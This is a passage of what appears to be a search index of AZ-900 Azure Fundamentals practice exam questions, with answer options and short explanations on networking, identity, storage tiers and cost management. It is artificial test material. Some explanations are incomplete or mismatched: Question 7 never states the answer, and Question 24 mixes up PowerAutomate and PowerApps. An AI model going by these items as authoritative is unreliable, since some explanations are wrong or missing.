on each subnet. For more info:\u00a0https://docs.microsoft.com/en-us/azure/security/fundamentals/network-best-practices</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-49-which-style-of-computing-is-easiest-when-migrating-an-existing-hosted-application-from-your-own-data-center-into-the-cloud","title":"Question 49:\u00a0Which style of computing is easiest when migrating an existing hosted application from your own data center into the cloud?","text":"<ul> <li>PaaS</li> <li>IaaS</li> <li>FaaS</li> <li>Serverless</li> </ul> <p>Explanation: Infrastructure as a service is the easiest to migrate into, from an existing hosted app - lift and shift. For more info:\u00a0https://azure.microsoft.com/en-us/overview/what-is-iaas/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-50-if-you-have-an-azure-free-account-with-a-200-credit-for-the-first-month-what-happens-when-you-reach-the-200-limit","title":"Question 50:\u00a0If you have an Azure free account, with a $200 credit for the first month, what happens when you reach the $200 limit?","text":"<ul> <li>Your account is automatically closed.</li> <li>Your credit card is automatically billed.</li> <li>All services are stopped and you must decide whether you want to convert to a paid account or not.</li> <li>You cannot create any more resources until you add more credits to the account.</li> </ul> <p>Explanation: Using up the free credits causes all your resources to be stopped until you decide to get a paid account. For more info:\u00a0https://azure.microsoft.com/en-us/free/free-account-faq/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#test-4","title":"Test 4","text":"","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-1-all-resources-in-a-vnet-can-communicate-outbound-to-the-internet-by-default","title":"Question 1:\u00a0All resources in a VNet can communicate outbound to the internet, by default.","text":"<ul> <li>No </li> <li>Yes </li> </ul> <p>Azure Virtual Network (VNet)\u00a0is the fundamental building block for your private network in Azure. VNet enables many types of Azure resources, such as Azure Virtual Machines (VM), to securely communicate with each other, the internet, and on-premises networks. VNet is similar to a traditional network that you'd operate in your own data center, but brings with it additional benefits of Azure's infrastructure such as scale, availability, and isolation. All resources in a VNet can communicate outbound to the internet, by default. You can communicate inbound to a resource by assigning a public IP address or a public Load Balancer. You can also use public IP or public Load Balancer to manage your outbound connections. To learn more about outbound connections in Azure, see\u00a0Outbound connections,\u00a0Public IP addresses, and\u00a0Load Balancer</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-2-is-it-possible-for-you-to-run-both-bash-and-powershell-based-scripts-from-the-azure-cloud-shell","title":"Question 2:\u00a0Is it possible for you to run BOTH\u00a0Bash and Powershell based scripts from the Azure Cloud shell?","text":"<ul> <li>Yes  </li> <li>No</li> </ul> <p>Azure Cloud Shell is an interactive, authenticated, browser-accessible shell for managing Azure resources. It provides the flexibility of choosing the shell experience that best suits the way you work,\u00a0either Bash or PowerShell.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-3-as-the-cloud-admin-of-your-organization-you-want-to-block-your-employees-from-accessing-your-apps-from-specific-locations-which-of-the-following-can-help-you-achieve-this","title":"Question 3:\u00a0As the Cloud Admin of your organization, you want to Block your employees from accessing your apps from specific locations. Which of the following can help you achieve this?","text":"<ul> <li>Azure Active Directory Conditional Access  </li> <li>Azure Sentinel - Azure Single Sign On (SSO) </li> <li>Azure Role Based Access Control (RBAC) </li> </ul> <p>The modern security perimeter now extends beyond an organization's network to include user and device identity. Organizations can use identity-driven signals as part of their access control decisions. Conditional Access brings signals together, to make decisions, and enforce organizational policies. Azure AD Conditional Access is at the heart of the new identity-driven control plane. Conditional Access policies at their simplest are if-then statements, if a user wants to access a resource, then they must complete an action. Example: A payroll manager wants to access the payroll application and is required to do multi-factor authentication to access it.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-4-what-is-the-primary-purpose-of-external-identities-in-azure-active-directory","title":"Question 4:\u00a0What is the primary purpose of external identities in Azure Active Directory?","text":"<ul> <li>To enable single sign-on between Azure subscriptions. </li> <li>To manage user identities exclusively for on-premises applications. </li> <li>To allow external partners and customers to access resources in your Azure environment  </li> <li>To provide secure access to Azure resources for employees within the organization.</li> </ul> <p>External identities in Azure AD enable organizations to extend their identity management beyond their own employees. This allows external partners, vendors, and customers to access specific resources within the organization's Azure environment without requiring them to have internal accounts. Reference:\u00a0https://learn.microsoft.com/en-us/azure/active-directory/external-identities/external-identities-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-5-your-startup-plans-to-migrate-to-azure-soon-but-for-all-the-resources-you-would-like-control-of-the-underlying-operating-system-and-middleware-which-of-the-following-cloud-models-would-make-the-most-sense","title":"Question 5:\u00a0Your startup plans to migrate to Azure soon, but for all the resources, you would like control of the underlying Operating System and Middleware. Which of the following cloud models would make the most sense?","text":"<ul> <li>Infrastructure as a Service (laaS)  </li> <li>Anything as a Service (XaaS) </li> <li>Platform as a Service (PaaS) </li> <li>Software as a Service (SaaS)</li> </ul> <p>Infrastructure as a service (IaaS)\u00a0is a type of cloud computing service that offers essential compute, storage, and networking resources on demand, on a pay-as-you-go basis. IaaS is one of the four types of cloud services, along with software as a service (SaaS), platform as a service (PaaS), and\u00a0serverless. Migrating your organization's infrastructure to an IaaS solution helps you reduce maintenance of on-premises data centers, save money on hardware costs, and gain real-time business insights. IaaS solutions give you the flexibility to scale your IT resources up and down with demand. They also help you quickly provision new applications and increase the reliability of your underlying infrastructure. IaaS lets you bypass the cost and complexity of buying and managing physical servers and datacenter infrastructure. Each resource is offered as a separate service component, and you only pay for a particular resource for as long as you need it. A\u00a0cloud computing service provider\u00a0like\u00a0Azure\u00a0manages the infrastructure, while you purchase, install, configure, and manage your own software\u2014including operating systems, middleware, and applications.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-6-your-company-has-decided-to-migrate-its-on-premises-virtual-machines-to-azure-which-azure-virtual-machines-feature-allows-you-to-migrate-virtual-machines-without-downtime","title":"Question 6:\u00a0Your company has decided to migrate its on-premises virtual machines to Azure. Which Azure Virtual Machines feature allows you to migrate virtual machines without downtime?","text":"<ul> <li>Azure Virtual Machine Scale Sets </li> <li>Azure Site Recovery </li> <li>Azure Spot Virtual Machines </li> <li>Azure Reserved Virtual Machines</li> </ul> <p>The correct answer is Azure Site Recovery. Azure Site Recovery (ASR)\u00a0is a service offered by Azure that enables replication of virtual machines from on-premises environments to Azure or between Azure regions with little or no downtime. This allows for the migration of virtual machines to Azure without any disruption to business operations. After replication to Azure, the virtual machines can be launched and used as if they were in the on-premises environment.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-7-youve-been-planning-to-decommission-your-on-prem-database-hosting-gigabytes-of-data-which-of-the-following-is-true-about-data-ingress-moving-into-for-azure","title":"Question 7:\u00a0You've been planning to decommission your On-Prem database hosting Gigabytes of data. Which of the following is True about data ingress (moving into) for Azure?","text":"<ul> <li>It is free of cost  </li> <li>It is charged $0.05 per GB </li> <li>It is charged $0.05 per TB </li> <li>It is charged per hour of data transferred</li> </ul> <p>Bandwidth refers to data moving in and out of Azure data centres, as well as data moving between Azure data centres; other transfers are explicitly covered by the Content Delivery Network, ExpressRoute pricing or Peering. #### Question 8:\u00a0Correct</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-8-which-of-the-following-is-a-cloud-security-posture-management-cspm-and-cloud-workload-protection-platform-cwpp-for-all-of-your-azure-on-premises-and-multicloud-amazon-aws-and-google-gcp-resources","title":"Question 8: Which of the following is a Cloud Security Posture Management (CSPM) and Cloud Workload Protection Platform (CWPP) for all of your Azure, On-Premises, AND Multicloud (Amazon AWS and Google GCP) resources?","text":"<ul> <li>Microsoft Defender for Cloud  </li> <li>Azure DDoS Protection </li> <li>Azure Front Door </li> <li>Azure Key Vault </li> <li>Azure Sentinel</li> </ul> <p>Microsoft Defender for Cloud is a Cloud Security Posture Management (CSPM) and Cloud Workload Protection Platform (CWPP) for all of your Azure, on-premises, and multicloud (Amazon AWS and Google GCP) resources. Defender for Cloud fills three vital needs as you manage the security of your resources and workloads in the cloud and on-premises:</p> <ul> <li>Defender for Cloud secure score continually assesses\u00a0your security posture so you can track new security opportunities and precisely report on the progress of your security efforts. - Defender for Cloud recommendations secures\u00a0your workloads with step-by-step actions that protect your workloads from known security risks. - Defender for Cloud alerts defends\u00a0your workloads in real-time so you can react immediately and prevent security events from developing.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-9-which-of-the-following-is-a-key-benefit-of-using-role-based-access-control-rbac-over-traditional-access-control-methods","title":"Question 9:\u00a0Which of the following is a key benefit of using Role-Based Access Control (RBAC) over traditional access control methods?","text":"<ul> <li>RBAC supports a wider range of authentication protocols than traditional methods. </li> <li>RBAC provides centralized management of user identities and access. </li> <li>RBAC allows you to assign permissions to specific roles rather than individual users.  </li> <li>RBAC provides stronger encryption for sensitive data. </li> </ul> <p>Role-Based Access Control (RBAC)\u00a0is an approach to access control that allows you to manage user access based on the roles they perform within an organization. With RBAC, you can define a set of roles, each with a specific set of permissions, and then assign users to those roles.</p> <p>One of the key benefits of RBAC over traditional access control methods is that it allows you to assign permissions to specific\u00a0roles\u00a0rather than individual users. This means that when a user's role changes, their permissions can be automatically adjusted without the need for manual updates. This can help to streamline the process of managing access control and reduce the risk of errors or oversights. </p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-10-which-of-the-following-provides-support-for-key-migration-workloads-like-windows-sql-and-linux-server-databases-data-web-apps-and-virtual-desktops","title":"Question 10:\u00a0Which of the following provides support for key migration workloads like Windows, SQL and Linux Server, databases, data, web apps, and virtual desktops?","text":"<ul> <li>Azure Suggestions </li> <li>Azure Recommendations </li> <li>Azure Advisor </li> <li>Azure Migrate </li> </ul> <p>Azure Migrate\u00a0provides all the Azure migration tools and guidance you need to plan and implement your move to the cloud\u2014and track your progress using a central dashboard that provides intelligent insights. Use a\u00a0comprehensive approach\u00a0to migrating your application and datacenter estate. Get support for key migration workloads like\u00a0Windows,\u00a0SQL\u00a0and\u00a0Linux Server, databases, data,\u00a0web apps, and virtual desktops. Migrate to destinations including Azure Virtual Machines, Azure VMware Solution, Azure App Service, and Azure SQL Database. Migrations are holistic across VMware, Hyper-V, physical server, and cloud-to-cloud migration.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-11-which-type-of-scaling-focuses-on-adjusting-the-capabilities-of-resources-such-as-increasing-processing-power","title":"Question 11: Which type of scaling focuses on adjusting the capabilities of resources, such as increasing processing power?","text":"<ul> <li>Static scaling</li> <li>Vertical scaling </li> <li>Elastic scaling</li> <li>Horizontal scaling</li> </ul> <p>Vertical scaling involves adjusting the capabilities of resources, such as adding more CPUs or RAM to a virtual machine. It focuses on enhancing the capacity of individual resources. With horizontal scaling, if you suddenly experienced a steep jump in demand, your deployed resources could be scaled out (either automatically or manually). For example, you could add additional virtual machines or containers, scaling out. In the same manner, if there was a significant drop in demand, deployed resources could be scaled in (either automatically or manually), scaling in.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-12-what-is-the-default-action-for-a-network-security-rule-nsg-rule-if-no-other-action-is-specified","title":"Question 12:\u00a0 What is the default action for a Network Security Rule (NSG) rule if no other action is specified?","text":"<ul> <li>Allow</li> <li>Block</li> <li>Deny </li> </ul> <p>The default action for an NSG rule if no other action is specified is\u00a0DENY.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-13-what-is-the-primary-purpose-of-a-public-endpoint-in-azure","title":"Question 13:\u00a0What is the primary purpose of a public endpoint in Azure?","text":"<ul> <li>To prevent communication between virtual networks.</li> <li>To enforce access control policies for resource groups.</li> <li>To restrict incoming network traffic to specific IP ranges. </li> <li>To provide a direct and secure connection to Azure services.  </li> </ul> <p>A\u00a0public\u00a0endpoint in Azure allows resources to be accessed over the public internet. It's used to expose services to clients or users who are not within the same network as the resource. Public endpoints are commonly used for services that need to be accessed from anywhere, such as web applications.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-14-what-is-the-minimum-azure-ad-edition-required-to-enable-self-service-password-reset-for-users","title":"Question 14:\u00a0What is the minimum Azure AD edition required to enable self-service password reset for users?","text":"<ul> <li>Premium P2 edition</li> <li>Premium P1 edition </li> <li>Basic edition</li> <li>Free edition</li> </ul> <p>The correct answer is - Premium P1 edition is the minimum required edition to enable self-service password reset for users in Azure AD. Reference: https://azure.microsoft.com/en-us/pricing/details/active-directory/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-15-an-_____-is-a-collection-of-policy-definitions-that-are-grouped-together-towards-a-specific-goal-or-purpose-in-mind","title":"Question 15:  An\u00a0 _____\u00a0 is a collection of policy definitions that are grouped together towards a specific goal or purpose in mind.","text":"<ul> <li>Azure Collection</li> <li>Azure Initiative Correct)</li> <li>Azure Group</li> <li>Azure Bundle</li> </ul> <p>An\u00a0Azure initiative\u00a0is a collection of Azure policy definitions that are grouped together towards a specific goal or purpose in mind. Azure initiatives simplify management of your policies by grouping a set of policies together as one single item. For example, you could use the PCI-DSS built-in initiative which has all the policy definitions that are centered around meeting PCI-DSS compliance. Similar to Azure Policy, initiatives have\u00a0definitions\u00a0( a bunch of policies ) , assignments and parameters. Once you determine the definitions that you want, you would assign the initiative to a scope so that it can be applied.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-16-which-service-would-you-use-to-reduce-the-overhead-of-manually-assigning-permissions-to-a-set-of-resources","title":"Question 16:\u00a0Which service would you use to reduce the overhead of manually assigning permissions to a set of resources?","text":"<ul> <li>Azure Resource Manager </li> <li>Azure Trust Center</li> <li>Azure Policy </li> <li>Azure Logic Apps</li> </ul> <p>Azure Resource Manager\u00a0is the deployment and management service for Azure. It provides a management layer that enables you to create, update, and delete resources in your Azure account. You use management features, like access control, locks, and tags, to secure and organize your resources after deployment. </p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-17-which-of-the-following-authentication-protocols-is-not-supported-by-azure-ad","title":"Question 17:\u00a0Which of the following authentication protocols is not supported by Azure AD?","text":"<ul> <li>OpenID Connect </li> <li>NTLM </li> <li>OAuth 2.0 </li> <li>SAML</li> </ul> <p>Azure AD does support SAML, OAuth 2.0, and OpenID Connect authentication protocols. However,\u00a0NTLM\u00a0is not supported by Azure AD. NTLM is a legacy authentication protocol that is not recommended for modern authentication scenarios due to its security limitations. Azure AD recommends using modern authentication protocols such as SAML, OAuth 2.0, and OpenID Connect, which provide stronger security and support features such as multi-factor authentication and conditional access. Therefore, the correct answer is NTLM.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-18-which-of-the-following-is-an-offline-tier-optimized-for-storing-data-that-is-rarely-accessed-and-that-has-flexible-latency-requirements","title":"Question 18:\u00a0Which of the following is an offline tier optimized for storing data that is rarely accessed, and that has flexible latency requirements?","text":"<ul> <li>Cool Tier</li> <li>Infrequent Tier</li> <li>Hot Tier</li> <li>Archive Tier </li> </ul> <p>Data stored in the cloud grows at an exponential pace. To manage costs for your expanding storage needs, it can be helpful to organize your data based on how frequently it will be accessed and how long it will be retained. Azure storage offers different access tiers so that you can store your blob data in the most cost-effective manner based on how it's being used. Azure Storage access tiers include:</p> <ul> <li>Hot tier\u00a0- An online tier optimized for storing data that is accessed or modified frequently. The Hot tier has the highest storage costs, but the lowest access costs.</li> <li>Cool tier\u00a0- An online tier optimized for storing data that is infrequently accessed or modified. Data in the Cool tier should be stored for a minimum of 30 days. The Cool tier has lower storage costs and higher access costs compared to the Hot tier.</li> <li>Archive tier\u00a0- An offline tier optimized for storing data that is rarely accessed, and that has flexible latency requirements, on the order of hours. Data in the Archive tier should be stored for a minimum of 180 days.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-19-___-brings-signals-together-to-make-decisions-and-enforce-organizational-policies-in-simple-terms-they-are-if-then-statements-if-a-user-wants-to-access-a-resource-then-they-must-complete-an-action","title":"Question 19:\u00a0___ brings signals together, to make decisions, and enforce organizational policies. In simple terms, they are if-then statements, if a user wants to access a resource, then they must complete an action.","text":"<ul> <li>Demand Access</li> <li>Logical Access</li> <li>Conditional Access </li> <li>Active Directory Access</li> </ul> <p>The modern security perimeter now extends beyond an organization's network to include user and device identity. Organizations can use identity-driven signals as part of their access control decisions. Conditional Access brings signals together, to make decisions, and enforce organizational policies. Azure AD Conditional Access is at the heart of the new identity-driven control plane.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-20-which-of-the-following-services-can-you-use-to-calculate-your-estimated-hourly-or-monthly-costs-for-using-azure","title":"Question 20: Which of the following services can you use to calculate your estimated hourly or monthly costs for using Azure?","text":"<ul> <li>Azure Total Cost of Ownership (TCO)\u00a0calculator</li> <li>Azure Pricing Calculator </li> <li>Azure Calculator</li> <li>Azure Cost Management</li> </ul> <p>You can use the\u00a0Azure Pricing Calculator\u00a0to calculate your estimated hourly or monthly costs for using Azure.\u00a0Azure TCO\u00a0on the other hand is primarily used to estimate the cost savings you can realize by migrating your workloads to Azure.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-21-which-of-the-following-protocols-is-used-for-federated-authentication-in-azure-ad","title":"Question 21:\u00a0Which of the following protocols is used for federated authentication in Azure AD?","text":"<ul> <li>LDAP </li> <li>OpenID Connect</li> <li>OAuth 2.0</li> <li>SAML </li> </ul> <p>SAML (Security Assertion Markup Language)\u00a0is the protocol used for federated authentication in Azure AD. Federated authentication is a mechanism that allows users to use their existing credentials from a trusted identity provider (IdP) to authenticate with another application or service. In the context of Azure AD, federated authentication allows users to use their existing corporate credentials to authenticate with cloud-based applications and services. Azure AD supports several federated authentication protocols, including Security Assertion Markup Language (SAML), OAuth 2.0, and OpenID Connect. SAML is widely used for federated authentication in enterprise environments, while OAuth 2.0 and OpenID Connect are commonly used in web and mobile applications. Reference: https://docs.microsoft.com/en-us/azure/active-directory/develop/single-sign-on-saml-protocol</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-22-the-microsoft-_______-provides-a-variety-of-content-tools-and-other-resources-about-microsoft-security-privacy-and-compliance-practices","title":"Question 22: The Microsoft _______ provides a variety of content, tools, and other resources about Microsoft security, privacy, and compliance practices.","text":"<ul> <li>Privacy Policy</li> <li>Blueprints</li> <li>Service Trust Portal </li> <li>Advisor</li> </ul> <p>The Microsoft Service Trust Portal provides a variety of content, tools, and other resources about Microsoft security, privacy, and compliance practices. The Service Trust Portal contains details about Microsoft's implementation of controls and processes that protect our cloud services and the customer data therein. To access some of the resources on the Service Trust Portal, you must log in as an authenticated user with your Microsoft cloud services account (Azure Active Directory organization account) and review and accept the Microsoft Non-Disclosure Agreement for Compliance Materials.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-23-which-of-the-following-can-help-you-automate-deployments-and-use-the-practice-of-infrastructure-as-code","title":"Question 23:\u00a0Which of the following can help you automate deployments and use the practice of infrastructure as code?","text":"<ul> <li>Mangement Groups </li> <li>ARM\u00a0Templates </li> <li>Azure Arc</li> <li>Azure IaaC </li> </ul> <p>To implement infrastructure as code for your Azure solutions, use\u00a0Azure Resource Manager templates (ARM templates).\u00a0The template is a JavaScript Object Notation (JSON) file that defines the infrastructure and configuration for your project. The template uses declarative syntax, which lets you state what you intend to deploy without having to write the sequence of programming commands to create it. In the template, you specify the resources to deploy and the properties for those resources.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-24-yes-or-no-it-is-possible-to-deploy-a-new-azure-virtual-network-vnet-using-powerautomate-on-a-google-chromebook","title":"Question 24:\u00a0Yes or No: It is possible to deploy a new Azure Virtual Network (VNet) using PowerAutomate on a Google Chromebook.","text":"<ul> <li>No </li> <li>Yes</li> </ul> <p>No, PowerApps is\u00a0not\u00a0a part of Azure!</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-25-___-is-a-unified-cloud-native-application-protection-platform-that-helps-strengthen-your-security-posture-enables-protection-against-modern-threats-and-helps-reduce-risk-throughout-the-cloud-application-lifecycle-across-multicloud-and-hybrid-environments","title":"Question 25: ___ is a unified cloud-native application protection platform that helps strengthen your security posture, enables protection against modern threats, and helps reduce risk throughout the cloud application lifecycle across multicloud and hybrid environments.","text":"<ul> <li>Azure Bastion</li> <li>Azure Firewall</li> <li>Microsoft Priva</li> <li>Microsoft Defender for Cloud </li> <li>Azure Network Security Group</li> </ul> <p>From the official documentation:\u00a0Microsoft Defender for Cloud is a unified cloud-native application protection platform that helps strengthen your security posture, enables protection against modern threats, and helps reduce risk throughout the cloud application lifecycle across multicloud and hybrid environments.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-26-__-infrastructure-as-code-involves-writing-scripts-in-languages-like-bash-or-powershell-you-explicitly-state-commands-that-are-executed-to-produce-a-desired-outcome","title":"Question 26:\u00a0__ Infrastructure as Code\u00a0involves writing scripts in languages like Bash or PowerShell. You explicitly state commands that are executed to produce a desired outcome.","text":"<ul> <li>Declarative</li> <li>Imperative </li> <li>Ad-Hoc</li> <li>Defined </li> </ul> <p>There are two approaches you can take when implementing Infrastructure as Code.</p> <ul> <li>Imperative Infrastructure as Code\u00a0involves writing scripts in languages like Bash or PowerShell. You explicitly state commands that are executed to produce a desired outcome. When you use imperative deployments, it's up to you to manage the sequence of dependencies, error control, and resource updates.</li> <li>Declarative Infrastructure as Code\u00a0involves writing a definition that defines how you want your environment to look. In this definition, you specify a desired outcome rather than how you want it to be accomplished. The tooling figures out how to make the outcome happen by inspecting your current state, comparing it to your target state, and then applying the differences.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-27-which-of-these-approaches-is-not-a-cost-saving-solutions","title":"Question 27:\u00a0Which of these approaches is NOT a cost saving solutions?","text":"<ul> <li>Use Reserved Instances with Azure Hybrid</li> <li>Load balancing the incoming traffic </li> <li>Use the correct and appropriate instance size based on current workload</li> <li>Making use of Azure Cost Management</li> </ul> <p>Load balancing is done to increase the overall availability of the application\u00a0not\u00a0to optimize costs.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-28-______-infrastructure-as-code-involves-writing-a-definition-that-defines-how-you-want-your-environment-to-look-in-this-definition-you-specify-a-desired-outcome-rather-than-how-you-want-it-to-be-accomplished","title":"Question 28: ______ Infrastructure as Code\u00a0involves writing a definition that defines how you want your environment to look. In this definition, you specify a desired outcome rather than how you want it to be accomplished.","text":"<ul> <li>Ad-Hoc</li> <li>Imperative</li> <li>Declarative </li> <li>Defined</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-29-which-of-the-following-can-you-use-to-set-spending-thresholds","title":"Question 29:\u00a0Which of the following can you use to set spending thresholds?","text":"<ul> <li>Azure Cost Management +\u00a0Billing </li> <li>Azure TCO</li> <li>Azure Policy</li> <li>Azure Pricing Calculator</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-30-which-of-the-following-azure-compliance-certifications-is-specifically-designed-for-the-healthcare-industry","title":"Question 30:\u00a0Which of the following Azure compliance certifications is specifically designed for the healthcare industry?","text":"<ul> <li>ISO 27001</li> <li>GDPR</li> <li>None of the above</li> <li>HIPAA/HITECH </li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-31-which-of-the-following-can-help-you-manage-multiple-azure-subscriptions","title":"Question 31:\u00a0Which of the following can help you manage multiple Azure Subscriptions?","text":"<ul> <li>Policies </li> <li>Management Groups </li> <li>Resource Groups</li> <li>Blueprints</li> </ul> <p>Each management group contains one or more subscriptions. Azure arranges management groups in a single hierarchy. You define this hierarchy in your Azure Active Directory (Azure AD) tenant to align with your organization's structure and needs. </p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-32-in-the-_-as-a-service-cloud-service-model-customers-are-responsible-for-managing-applications-data-runtime-middleware-and-operating-systems-while-the-cloud-provider-manages-the-underlying-infrastructure","title":"Question 32:\u00a0In the _ as a Service cloud service model, customers are responsible for managing applications, data, runtime, middleware, and operating systems, while the cloud provider manages the underlying infrastructure.","text":"<ul> <li>Infrastructure </li> <li>Platform</li> <li>Software</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-33-when-a-blob-is-in-the-archive-access-tier-what-must-you-do-first-before-accessing-it","title":"Question 33:\u00a0When a blob is in the archive access tier, what must you do first before accessing it?","text":"<ul> <li>Rehydrate it </li> <li>Modify its policy</li> <li>Add it to a new resource group</li> <li>Move it to File Storage</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-34-your-company-has-deployed-a-web-application-to-azure-and-you-want-to-restrict-access-to-it-from-the-internet-while-allowing-access-from-your-companys-on-premises-network-which-network-security-group-nsg-rule-would-you-configure","title":"Question 34:\u00a0Your company has deployed a web application to Azure, and you want to restrict access to it from the internet while allowing access from your company's on-premises network. Which Network Security Group (NSG) rule would you configure?","text":"<ul> <li>Inbound rule allowing traffic from any source to the web application's public IP address.</li> <li>Inbound rule allowing traffic from your company's on-premises network to the web application's private IP address. </li> <li>Outbound rule allowing traffic from any destination to your company's on-premises network.</li> <li>Outbound rule allowing traffic from the web application's private IP address to any destination.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-35-which-of-the-following-can-help-you-download-cost-and-usage-data-that-was-used-to-generate-your-monthly-invoice","title":"Question 35:\u00a0Which of the following can help you download cost and usage data that was used to generate your monthly invoice?","text":"<ul> <li>Azure Monitor</li> <li>Azure Cost Management </li> <li>Azure Advisor</li> <li>Azure Resource Manager</li> </ul> <p>Cost Management + Billing is a suite of tools provided by Microsoft that help you analyze, manage, and optimize the costs of your workloads. Using the suite helps ensure that your organization is taking advantage of the benefits provided by the cloud. You use Cost Management + Billing features to:</p> <ul> <li>Conduct billing administrative tasks such as paying your bill</li> <li>Manage billing access to costs</li> <li>Download cost and usage data that was used to generate your monthly invoice</li> <li>Proactively apply data analysis to your costs</li> <li>Set spending thresholds</li> <li>Identify opportunities for workload changes that can optimize your spending</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-36-____-asynchronously-replicates-the-same-applications-and-data-across-other-azure-regions-for-disaster-recovery-protection","title":"Question 36:\u00a0____ asynchronously replicates the same applications and data across other Azure regions for disaster recovery protection.","text":"<ul> <li>Cross-region replication </li> <li>Auto-Region Replication</li> <li>Auto-Region Replicas</li> <li>Across-Region Replication</li> </ul> <p>Cross-region replication is one of several important pillars in the Azure business continuity and disaster recovery strategy. Cross-region replication builds on the synchronous replication of your applications and data that exists by using availability zones within your primary Azure region for high availability. Cross-region replication asynchronously replicates the same applications and data across other Azure regions for disaster recovery protection. Some Azure services take advantage of cross-region replication to ensure business continuity and protect against data loss. Azure provides several\u00a0storage solutions\u00a0that make use of cross-region replication to ensure data availability. For example,\u00a0Azure geo-redundant storage\u00a0(GRS) replicates data to a secondary region automatically. This approach ensures that data is durable even if the primary region isn't recoverable.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-37-you-want-to-ensure-that-all-virtual-machines-deployed-in-your-azure-environment-are-configured-with-specific-antivirus-software-which-azure-service-can-you-use-to-enforce-this-policy","title":"Question 37:\u00a0You want to ensure that all virtual machines deployed in your Azure environment are configured with specific antivirus software. Which Azure service can you use to enforce this policy?","text":"<ul> <li>Azure Security Center</li> <li>Azure Policy </li> <li>Azure Monitor</li> <li>Azure Advisor</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-38-which-of-the-following-is-not-a-benefit-of-using-azure-arc","title":"Question 38:\u00a0Which of the following is NOT a benefit of using Azure Arc?","text":"<ul> <li>Centralized billing and cost management for all resources </li> <li>Improved security and compliance for resources</li> <li>Increased visibility and control over resources</li> <li>Consistent management of resources across hybrid environments</li> </ul> <p>Azure Arc\u00a0is a hybrid management service that allows you to manage your servers, Kubernetes clusters, and applications across on-premises, multi-cloud, and edge environments. Some of the benefits of using Azure Arc include consistent management of resources across hybrid environments, improved security and compliance for resources, and increased visibility and control over resources. Centralized billing and cost management for all resources:\u00a0Thus is not a benefit of using Azure Arc. While Azure provides centralized billing and cost management for resources in the cloud, Azure Arc is focused on managing resources across hybrid environments and does not provide billing or cost management features.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-39-yes-or-no-in-a-public-cloud-model-you-get-dedicated-hardware-storage-and-network-devices-than-the-other-organizations-or-cloud-tenants","title":"Question 39:\u00a0Yes or No: In a Public Cloud model, you get dedicated hardware, storage, and network devices than the other organizations or cloud \u201ctenants\".","text":"<ul> <li>Yes</li> <li>No  </li> 